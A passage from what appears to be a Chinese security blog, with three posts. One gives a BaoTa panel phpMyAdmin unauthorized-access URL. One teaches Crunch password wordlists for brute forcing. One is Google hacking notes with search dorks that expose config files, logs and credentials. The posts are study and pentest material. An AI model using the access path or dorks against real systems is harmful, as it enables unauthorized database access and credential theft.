</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">java反序列化 </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2020/09/12/WEB/Exploit/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"><i class="fas fa-angle-double-right"></i>宝塔面板phpmyadmin未授权访问漏洞</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2020-09-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:50:49.727Z" title="2020-12-23T08:50:49.727Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">a few seconds read (About 101 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/12/WEB/Exploit/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpmyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">宝塔面板phpmyadmin未授权访问漏洞</a></h1><div class="content"><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>phpmyadmin未授权访问漏洞</p>
<h2 id="二、影响范围"><a href="#二、影响范围" class="headerlink" title="二、影响范围"></a>二、影响范围</h2><p>宝塔Linux面板7.4.2版本和Windows面板6.8版本</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞未phpmyadmin未鉴权，可通过特定地址直接登录数据库的漏洞。</p>
<p>漏洞URL：<a target="_blank" rel="noopener" href="http://ip:888/pma">http://ip:888/pma</a>   即可直接登录（但要求必须安装了phpmyadmin）</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200905165002377.png" alt="image-20200905165002377"></p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/%E5%AE%9D%E5%A1%94/">宝塔, </a><a class="link-muted" rel="tag" href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">未授权访问漏洞 </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2018/05/15/WEB/Linux%E4%B8%8B%E7%9A%84%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7Crunch%EF%BC%8C%E5%88%9B%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%93%E5%B1%9E%E5%AD%97%E5%85%B8/"><i class="fas fa-angle-double-right"></i>Linux下的字典生成工具Crunch，创造自己的专属字典</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2018-05-15</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:49:56.800Z" title="2020-12-23T08:49:56.800Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">5 minutes read (About 818 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2018/05/15/WEB/Linux%E4%B8%8B%E7%9A%84%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7Crunch%EF%BC%8C%E5%88%9B%E9%80%A0%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%93%E5%B1%9E%E5%AD%97%E5%85%B8/">Linux下的字典生成工具Crunch，创造自己的专属字典</a></h1><div class="content"><p> ![password.jpg](Linux下的字典生成工具Crunch，创造自己的专属字典/15256173123056.jpg!small<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201201906720.png" style="zoom:50%;"></p>
<p><strong>Crunch是一种创建密码字典工具，按照指定的规则生成密码字典，可以灵活的制定自己的字典文件。使用Crunch工具生成的密码可以输出到屏幕，保存到文件、或另一个程序。由其在渗透测试需要爆破的时候，字典的编排等直接影响到我们的爆破速度，对整个渗透测试流程起着十分重要的作用。</strong></p>
<h2 id="0x00-安装"><a href="#0x00-安装" class="headerlink" title="0x00 安装"></a>0x00 安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address : https:&#x2F;&#x2F;sourceforge.net&#x2F;projects&#x2F;crunch-wordlist&#x2F;</span><br></pre></td></tr></table></figure>

<p><strong>Crunch</strong>为<strong>kali</strong>自带工具之一在kali环境下进行，文中提及的所有命令均可以在kali下直接运行。</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201201938900.png" alt="image-20201201201938900" style="zoom:50%;">

<h2 id="0x01-使用语法和参数"><a href="#0x01-使用语法和参数" class="headerlink" title="0x01 使用语法和参数"></a>0x01 使用语法和参数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch &lt;min&gt; &lt;max&gt; [options]</span><br></pre></td></tr></table></figure>

<p>参数详解</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">min    设定最小字符串长度（必选）</span><br><span class="line">max    设定最大字符串长度（必选）</span><br><span class="line"></span><br><span class="line">oprions</span><br><span class="line">-b     指定文件输出的大小，避免字典文件过大  </span><br><span class="line">-c     指定文件输出的行数，即包含密码的个数</span><br><span class="line">-d     限制相同元素出现的次数</span><br><span class="line">-e     定义停止字符，即到该字符串就停止生成</span><br><span class="line">-f     调用库文件（&#x2F;etc&#x2F;share&#x2F;crunch&#x2F;charset.lst）</span><br><span class="line">-i     改变输出格式，即aaa,aab -&gt; aaa,baa</span><br><span class="line">-I     通常与-t联合使用，表明该字符为实义字符</span><br><span class="line">-m     通常与-p搭配</span><br><span class="line">-o     将密码保存到指定文件</span><br><span class="line">-p     指定元素以组合的方式进行</span><br><span class="line">-q     读取密码文件，即读取pass.txt</span><br><span class="line">-r     定义重某一字符串重新开始</span><br><span class="line">-s     指定一个开始的字符，即从自己定义的密码xxxx开始</span><br><span class="line">-t     指定密码输出的格式</span><br><span class="line">-u     禁止打印百分比（必须为最后一个选项）</span><br><span class="line">-z     压缩生成的字典文件，支持gzip,bzip2,lzma,7z  </span><br></pre></td></tr></table></figure>

<p>特殊字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%      代表数字</span><br><span class="line">^      代表特殊符号</span><br><span class="line">@      代表小写字母</span><br><span class="line">,      代表大写字符   </span><br></pre></td></tr></table></figure>

<h2 id="0x02-实用案例"><a href="#0x02-实用案例" class="headerlink" title="0x02 实用案例"></a>0x02 实用案例</h2><p>（1）生成一个字典文件，用自己指定的字符（默认为26个小写字母为元素的所有组合）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 1 3 123</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202202799.png" alt="image-20201201202202799" style="zoom:50%;">

<p>（2）若字典中需要空格，;等用双引号来表示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 3 3 &quot;ab &quot;</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202253335.png" alt="image-20201201202253335" style="zoom:50%;">

<p>（3）生成几个元素的组合（可以用于社工中收集的信息）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 4 4 -p zhangsan 2018 0101 ..</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202347907.png" alt="image-20201201202347907" style="zoom:50%;">

<p>（4）生成指定的字符串（比如生成编号，手机号等）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 10 10 -t 201800%%%%</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202447905.png" alt="image-20201201202447905" style="zoom:50%;">

<p>（5）多种组合 生成3个元素的组合，前三位为定义的字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 3 3 -t d@% -p aaa bbb </span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202547817.png" alt="image-20201201202547817" style="zoom:50%;">

<p>（6）通过-l参数来使@,%^等特殊字符输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 7 7 -t p@ss,%^ -l a@aaaaa</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202715831.png" alt="image-20201201202715831" style="zoom:50%;">

<p>（7）-o参数也可使用&gt;&gt;来简化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 4 4 -d 2@ -t @@@% &gt;&gt; test.txt</span><br></pre></td></tr></table></figure>

<h2 id="0x03-调用密码库"><a href="#0x03-调用密码库" class="headerlink" title="0x03 调用密码库"></a>0x03 调用密码库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;crunch&#x2F;charset.lst</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201201202800863.png" alt="image-20201201202800863" style="zoom:50%;">

<p>特殊字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">numeric     表示0123456789</span><br><span class="line">Lalpha      表示26位小写字母</span><br><span class="line">Ualpha      表示26位大写字母</span><br></pre></td></tr></table></figure>

<p>实例：调用密码库 charset.lst中的 hex-upper项目字符，生成4位密码，其中格式为@ + hex-upper +% +%</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crunch 4 4 -f charset.lst hex-upper -t @@%% -l @xdd</span><br></pre></td></tr></table></figure>

<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>你也可以根据自己需要的字符自己编写密码库文件来完成对特殊字典的编写，来创造自己的专属字典。</p>
</div><hr style="height:1px;margin:1rem 0"><div class="level is-mobile is-flex"><div class="article-tags is-size-7 is-uppercase"><i class="fas fa-tags has-text-grey"></i> <a class="link-muted" rel="tag" href="/tags/crunch/">crunch </a></div></div></article></div><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><a class="has-link-black-ter" href="/2018/03/23/WEB/Google-hacking/"><i class="fas fa-angle-double-right"></i>Google hacking</a></h1><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt"> </i><time dateTime="${date_xml(page.date)}" title="${date_xml(page.date)}">2018-03-23</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-12-23T08:49:53.050Z" title="2020-12-23T08:49:53.050Z">2020-12-23</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check"> </i><time dateTime="${date_xml(page.updated)}" title="${date_xml(page.updated)}">2020-12-23</time></span><span class="level-item"><a class="link-muted" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span><span class="level-item">2 hours read (About 14853 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2018/03/23/WEB/Google-hacking/">Google hacking</a></h1><div class="content"><ul>
<li><p><strong>Google hacking</strong></p>
<p>​                                      <strong>-ol4three</strong>                                                                                                                                             </p>
<p><strong>第一章 搜索基础知识</strong></p>
<p><strong>1.1Google搜索的黄金法则</strong></p>
<ul>
<li>Google<strong>限制搜索关键字最多为32个单词</strong></li>
<li>Google查询是不区分大小写的：     <strong>//or必须大写</strong></li>
<li>Google的通配符 ： *****    </li>
<li>Google保留忽略查询关键字的权利：Google会忽略一个搜索中的某些常用单词、字母和一些单独的数字。指出这些词汇常称为<strong>“停用词”</strong></li>
<li><strong>强制Google使用常见词汇的一种方法是把他们用引号引起来、或者在查询项之前加一个+号</strong></li>
</ul>
<p><strong>1.2Google使用布尔操作符和特殊字符</strong></p>
<ul>
<li><strong>AND</strong> ：这个操作符用于在查询中包含多个关键字  hacker and cracker (<strong>常用于防止过滤掉一些常用词</strong>)  <strong>// + == “and justice for all”</strong></li>
<li><strong>NOT</strong> ：这个操作符用于从查询中忽略一个关键字  hacker -golf  ;  hacker -phlegm    (<strong>从你的查询中删除那些令人厌恶的字符</strong>)</li>
<li><strong>OR</strong>   ：这个操作符命令Google查找搜索中的一个或者另外一个关键字     <strong>//可以用 “|” 或者 OR 来代替   查询看作是一个从左到右的句子即可</strong></li>
<li><strong>特殊字符</strong>： 特殊字符将被Google默认转化</li>
</ul>
<p><strong>1.3网站链接</strong></p>
<ul>
<li><a target="_blank" rel="noopener" href="http://www.google.com">www.google.com</a>    <strong>Google的主页，大部分搜索的入口</strong></li>
<li><a target="_blank" rel="noopener" href="http://groups.google.com">http://groups.google.com</a>        <strong>Google group页面</strong></li>
<li><a target="_blank" rel="noopener" href="http://www.google.com/language/language_tools">www.google.com/language/language_tools</a>    <strong>各种语言和翻译选项</strong></li>
<li><a target="_blank" rel="noopener" href="http://www.google.com/advance_search">www.google.com/advance_search</a>        <strong>高级搜索表单</strong></li>
<li><a target="_blank" rel="noopener" href="http://www.google.com/preferences">www.google.com/preferences</a>        <strong>使用偏好设置</strong></li>
</ul>
<p><strong>第二章 高级搜索符</strong></p>
<p><strong>2.1简介</strong></p>
<ul>
<li><strong>intitle,allintitle</strong></li>
<li><strong>inurl,allinurl</strong></li>
<li><strong>filetype</strong></li>
<li><strong>allintext</strong></li>
<li><strong>site</strong></li>
<li><strong>link</strong></li>
<li><strong>inanchor</strong></li>
<li><strong>daterange</strong></li>
<li><strong>cache</strong></li>
<li><strong>info</strong></li>
<li><strong>related</strong></li>
<li><strong>phonebook</strong></li>
<li><strong>rphonebook</strong></li>
<li><strong>bphonebook</strong></li>
<li><strong>author</strong></li>
<li><strong>group</strong></li>
<li><strong>msgid</strong></li>
<li><strong>insubject</strong></li>
<li><strong>stocks</strong></li>
<li><strong>define</strong></li>
</ul>
<p><strong>2.2操作符语法</strong></p>
<ul>
<li>在操作符、冒号、搜索关键字之间是没有空格的</li>
<li>如果用词组作为关键字的话，必须保证在操作符、冒号和词组的第一个引号之间没有任何空        格字符</li>
<li>高级操作符能够和单独的查询混合使用</li>
</ul>
<p><strong>2.3Google高级操作符</strong></p>
<p><strong>2.3.1 Intitle与Allintitle:    在页面标题中搜索</strong></p>
<ul>
<li>在页面标题中查找字符串</li>
<li>能够很好地和其他操作符混合使用</li>
<li>擅长搜索网页、Group、图片和新闻</li>
<li>allintetle 在页面中查找所有的关键字（不能和其他混合使用）</li>
</ul>
<p><strong>2.3.2 Allintext: 在网页内容中查找关键字</strong></p>
<p><strong>2.3.3  Inurl 与 Allinurl: 在URL中查找文本</strong></p>
<ul>
<li>在页面的URL中查找字符串</li>
<li>能够很好地和其他操作符混合使用</li>
<li>擅长搜索网页加图片</li>
<li>Allinurl 不能和其他操作符或者关键字混合使用</li>
<li><strong>URL是统一资源定位符（简单来说它就是网页的地址）</strong></li>
</ul>
<p><strong>2.3.4 Site： 搜索精确到特定的站点</strong></p>
<ul>
<li>允许你仅在某个特定的网站或者特定的网站或者特定的域中搜索网页</li>
<li>能够很好地和其他操作符或者关键字混合使用，也可以单独使用</li>
<li>擅长搜索网页，Group以及图片</li>
<li>Google搜索是从右向左读取服务器名的</li>
</ul>
<p><strong>2.3.5Filetype： 搜索指定类型的文件</strong></p>
<ul>
<li>根据文件扩展名查找特定的文件</li>
<li>等同于ext</li>
<li>需要附加搜索关键字</li>
<li>能够附加搜索关键字</li>
<li>能够很好地和其他操作符混合使用</li>
</ul>
<p><strong>2.3.6 Link： 搜索与当前网页存在链接的网页</strong></p>
<ul>
<li>搜索链接到一个网站或者URL的链接</li>
<li>不能很好地和其他操作符和和搜索关键字混合使用</li>
<li>删除搜索网页、图片和新闻。</li>
<li>必须提供一个完整的URL（包括协议、服务器、目录以及文件），或者一个部分URL</li>
<li>当你提交一个无效的Link 给Google 他会当成一个词组来处理</li>
</ul>
<p><strong>2.3.7 Inanchor：在链接文本中查找文本</strong></p>
<ul>
<li>在链接描述文本中查找文本</li>
<li>能够很好地和其他操作符和搜索关键字混合使用</li>
<li>擅长搜索网页、图片和新闻</li>
<li>可以和其他操作符及搜索关键字混合使用</li>
</ul>
<p><strong>2.3.8 Cache： 显示网页的缓存版本</strong></p>
<ul>
<li>显示页面的缓存版本</li>
<li>不能很好地和其他操作符或者关键字混合使用</li>
<li>擅长搜索网页</li>
<li>eg： cache: blackhat.org</li>
</ul>
<p><strong>2.3.9 Numerange： 搜索数字</strong></p>
<ul>
<li>在某一特定范围内查找数字</li>
<li>能够很好地和其他操作符或搜索关键字混合使用</li>
<li>擅长搜索网页</li>
<li>与ext同效</li>
</ul>
<p><strong>2.3.10 Daterange： 查找在某个特定日期范围内发布的网页</strong></p>
<ul>
<li>这个日期必须使用儒略历</li>
<li>deterange操作符必须和其他搜索关键字或高级操作符同时使用</li>
</ul>
<p><strong>2.3.11 Info： 显示Google的摘要信息</strong></p>
<ul>
<li>该操作符的参数必须是一个有效的URL或者网站名。、</li>
<li>info操作符不能和其他操作符或者搜索关键字混合使用</li>
<li>显示网页的摘要信息</li>
</ul>
<p><strong>2.3.12 Related： 显示相关站点</strong></p>
<ul>
<li>显示与“提交的网站或URL相关的” 站点</li>
<li>不能很多地和其他操作符或者关键字混合使用</li>
<li>擅长搜索网页</li>
</ul>
<p><strong>2.3.13 Author： 搜索Groups中新闻组帖子的作者</strong></p>
<ul>
<li>搜索Group帖子的作者</li>
<li>能够和其他混合使用</li>
<li>擅长搜索Group</li>
</ul>
<p><strong>2.3.14 Group： 搜索Group标题</strong></p>
<p><strong>2.3.15 Insubject： 搜索Google group主题行</strong></p>
<ul>
<li>在Group帖子的主题中查找字符串</li>
<li>能够很好地和其他操作符或搜索关键字混合使用</li>
</ul>
<p><strong>2.3.16 Msgid： 通过消息ID来查找Group帖子</strong></p>
<ul>
<li>不能很好的和其他操作符混合使用</li>
</ul>
<p><strong>2.3.17 Stocks： 搜索股票信息</strong></p>
<p><strong>2.3.18 Define： 显示某个术语的定义</strong></p>
<ul>
<li>显示对提供的单词或者词组的各种定义</li>
<li>不能很好地和其他操作符或者关键字混合使用</li>
<li>擅长搜索网页</li>
</ul>
<p><strong>2.3.19 Phonebook: 搜索电话列表</strong></p>
<ul>
<li>rphonebook    住宅电话列表</li>
<li>bphonebook    商业电话列表</li>
<li>phone book    商业和住宅电话列表</li>
</ul>
<p><strong>2.4操作符冲突与糟糕的Search-Fu</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3926.png" alt="0"></p>
<p><strong>2.5 网站链接</strong></p>
<ul>
<li>Google文件类型FAQ， <strong><a target="_blank" rel="noopener" href="http://www.google.com/help/faq_filetypes.html">www.google.com/help/faq_filetypes.html</a></strong></li>
<li>文件扩展名信息资源，<strong><a target="_blank" rel="noopener" href="http://www.filext.com">www.filext.com</a></strong>  这个网站能够帮助你找到某个特定的扩展名与何种程序相关联</li>
<li><strong><a target="_blank" rel="noopener" href="http://searchenginewatch.com/searchday/article.php/20160061">http://searchenginewatch.com/searchday/article.php/20160061</a></strong> 这篇文章讨论了和Google日期限定搜索选项有关的话题</li>
<li>非常棒的在线Julian日期转换工具，<strong><a target="_blank" rel="noopener" href="http://www.24hourtranslations.co.uk/dates.htm">www.24hourtranslations.co.uk/dates.htm</a></strong>和<strong><a target="_blank" rel="noopener" href="http://www.tesre.bo.cnr.it/~mauro/JD/">www.tesre.bo.cnr.it/~mauro/JD/</a></strong></li>
</ul>
<p><strong>第三章 Google hacking基础</strong></p>
<p><strong>3.1 简介</strong></p>
<ul>
<li>在浏览页面的缓存版本时。存在某种匿名隐藏的特征，来隐藏你的浏览行为</li>
<li>本章我们将了解一种遍历技术， 学习： <strong>目录遍历</strong>、<strong>数字范围扩展</strong>以及<strong>扩展名搜索</strong></li>
</ul>
</li>
</ul>
<p>  <strong>3.2 使用缓存进行匿名浏览</strong></p>
<ul>
<li>Google会保存大部分他所抓取到的网页数据。虽然并不是都是如此而且这种情况也是可以防止的，但是大多数Google抓取的数据都被复制了一份，而且可以通过搜索结果页面的缓存链接来访问</li>
<li><a target="_blank" rel="noopener" href="http://www.phrack.org">www.phrack.org</a></li>
<li>点击缓存链接斌不是只从Google的数据库中加载网页，他还会连接到真是的服务器以访问图片以及其他非HTML内容</li>
<li>在缓存URL的尾部添加<strong>&amp;**</strong>strip=1<strong>将只显示缓存网页的文本。以这种范式访问缓存页面不会连接到网站的真实服务器，而且如果你使用的是本章中提到的剪切和粘贴的方法，还能够保护你的</strong>匿名性**。</li>
<li>tcpdump -n命令来抓捕这些数据</li>
<li>也可以使用服务器网站 eg：atomintersoft |  samair.ru</li>
</ul>
<p>  <strong>3.3 目录列表</strong></p>
<ul>
<li>目录列表是一种能够列出网站服务器上存在的文件和目录的网页类型。</li>
</ul>
<p>  <strong>目录列表十分类似于FTP服务器</strong></p>
<ul>
<li>它们自身并不安全</li>
<li>它们显示出来的信息能够帮助攻击者了解网站服务器的某些特定技术细节</li>
<li>它们无法区分公开的文件和那些私有的文件</li>
<li>它们通常都是偶然显示出来的，这是因为许多网站服务器都是在顶层索引文件（index.htm、index.htm 、default.asp等）丢失或者无效的时候才会显示目录</li>
</ul>
<p>  <strong>3.3.1 查找目录列表</strong></p>
<ul>
<li>目录列表包含了大量很有价值的目录</li>
<li>最好的查找包含目录列表页面的方法是使用诸如intitle:index.of “parent directory” 或者 intitle:index.of name size之类的查询</li>
</ul>
<p>  <strong>3.3.2 查找特定的目录</strong></p>
<ul>
<li>你可以很容易地在目录列表中查找特定的目录，而只需要index.of查询上加一个目录名即可。例如，intitle:index.of inurl:backup可以用来查找URL中含有单词backup的目录列表。如果URL中含有单词backup，那么很有可能这是一个目录名</li>
</ul>
<p>  <strong>3.3.3 查找特定的文件</strong></p>
<ul>
<li>你可以很容易地在目录列表中查找特定的文件： 只需要简单地在index.of查询中加入文件名即可，例如intitle:index.of ws_ftp.log</li>
</ul>
<p>  <strong>3.3.4 服务器版本</strong></p>
<ul>
<li>某些服务器，尤其是Apache和Apache的派生服务器常常会在目录列表的底部加上一个服务器标志。这些服务器标志可以通过拓展index.of搜索来查找到，如intitle:index.of server.at</li>
<li>你也可以搜索特定版本的web服务器，这是通过添加一个正确格式的服务器标志来实现的。例如， intitle:index.of server.at “Apache Tomcat/“ 能够找到运行各种版本的Apache Tomcat服务其的网站（<strong>同样的nmap也可以来识别</strong>）</li>
</ul>
<p>  <strong>3.4 险境：遍历技术</strong></p>
<p>  <strong>3.4.1  目录遍历</strong></p>
<ul>
<li>一旦你在服务器上找到了某个特定的目录，就可以使用这个技术来查找其他的目录或者子目录</li>
<li>完成这种任务的一个简单的办法就是利用目录列表。只要点击parent directory链接，就可以进入当前目录的上一级目录。如果该父目录仍包含其他的目录列表，那么你可以通过点击其链接来挖掘其他的目录。如果父目录没有显示目录列表，那么你可能就需要诉诸于一种更为复杂的方法了。即猜测目录名并把他们添加到父目录的URL的尾部。或者，考虑在Google搜索中使用site和Inurl关键词</li>
</ul>
<p>  <strong>3.4.2 递增置换</strong></p>
<ul>
<li>递增置换是 “取一个数并用下一个更大的或者更小的数来代替这个数” 的形象的说法</li>
<li>这个技术可以用于挖掘在目录名或者文件名中使用数字的站点。这种技术只需要用更大的或者更小的数来替代原来的数字，但是要注意保持文件名或者目录名中剩下的部分不变（注意那些零）。或者，在Google搜索中使用site，在加上inurl或者filetype关键字。</li>
</ul>
<p>  <strong>3.4.3 拓展遍历</strong></p>
<ul>
<li>这种技术可以用于查找文件名相同，而扩展名不同的文件（例如备份文件）</li>
<li>实现拓展遍历技术最容易的方法是在URL中，用一种扩展名来替代另一种扩展名，例如，用bak代替html</li>
<li>目录列表，尤其是缓存目录列表，是最容易判定备份文件是否存在的方法，也能够判定可能用于网站其他部分的扩展名</li>
</ul>
<p>  <strong>3.5 网站链接</strong></p>
<ul>
<li><strong><a target="_blank" rel="noopener" href="http://www.all-nettools.com/pr.htm">www.all-nettools.com/pr.htm</a></strong>    一个简便的代理检查工具，它能够帮助你测试正在使用的代理服务器</li>
<li><strong><a target="_blank" rel="noopener" href="http://www.sensepost.com/research/wikto">http://www.sensepost.com/research/wikto</a></strong>    Sensepost的Wikto工具，一个很强大的web扫描工具，它还结合了使用Google hacking数据库的Google查询测试。</li>
<li><strong>一个简单的Google搜索可以用来在不对站点管理员或侵入检测系统，并且搜集到的信息都可以在以后的评估中重复使用。</strong></li>
</ul>
<p>  <strong>第四章 文档加工和数据库挖掘</strong></p>
<p>  <strong>4.1 简介</strong></p>
<ul>
<li>互联网上的文档都是有价值的。“好人”和“坏人”都可以利用在文档中的信息来达到他们各自的目的</li>
<li>这章我们就来学习一下关于文档的挖掘</li>
</ul>
<p>  <strong>4.2 配置文件</strong></p>
<p>  <strong>4.2.1 基本信息：</strong></p>
<ul>
<li>配置文件能够向攻击者泄露<strong>敏感的信息</strong></li>
<li>尽管配置文件的文件名不同，但是仍可以通过文件的扩展名来找到配置的文件，例如<strong>INI、CONF、CONFIG、或CFG</strong></li>
<li>配置文件存储了程序的设置和程序的用法</li>
<li>对于配置文件来说攻击者可以根据其提供的各种信息来寻找相应的方法甚至继续在寻找更深的东西出来</li>
<li>对于搜索文件来说最好尝试用不同类型的搜索方法 eg:<strong>intitle:index.of ws_ftp.ini</strong> | <strong>filetype:ini inurl:ws_ftp.ini</strong> 都可以找到一些东西</li>
<li>eg： <strong>filetype:conf inurl: firlwall</strong>  它可以搜索出防火墙的配置文件 </li>
<li>eg： <strong>(inurl:conf OR inurl:config OR inurl:cfg)</strong>使用这样的联合搜索 正如一个攻击者知道你的配置文件的名称就可以通过filetype inutl 来更准确的寻找需要的文件 </li>
</ul>
<p>  <strong>4.2.2 对于一个Google黑客在搜索配置文件是应该注意的一些东西：</strong></p>
<ul>
<li>使用可用的配置文件中特有的单词或词组来创建一个强大的基本搜索</li>
<li>过滤掉sample example test howto tutorial单词以剔除明显的实例文件</li>
<li>用-cvs过滤掉CVS存储器，他们通常存放了默认的配置文件</li>
<li>如果是搜索UNIX程序的配置文件，那么就要过滤掉manpage或者Manual</li>
<li>搜索实例配置文件中最长改变的域，并且对该与执行缩简搜索、以提出可能的样例文件</li>
</ul>
<p>  <strong>4.2.3 配置文件搜索实例：</strong></p>
<p>  ​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4958.jpeg" alt="0"></p>
<p>  ​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4957.jpeg" alt="0"></p>
<p>  <strong>4.3 日志文件</strong></p>
<ul>
<li><p>日志文件记录了一些信息 甚至包括一些时间和 IP地址到用户名与口令 例如银行卡账号</p>
</li>
<li><p>filetype:log inurl: log 或者是更简单的ext:log log</p>
</li>
<li><p>下面列出一些日志文件搜索实例</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4972.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4974.jpeg" alt="0"></p>
</li>
</ul>
<p>  <strong>filetype:log username putty</strong> 下图为搜索的结果该结果也可以在下一次<strong>继续使用</strong></p>
<p>  ​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4976.jpeg" alt="0"></p>
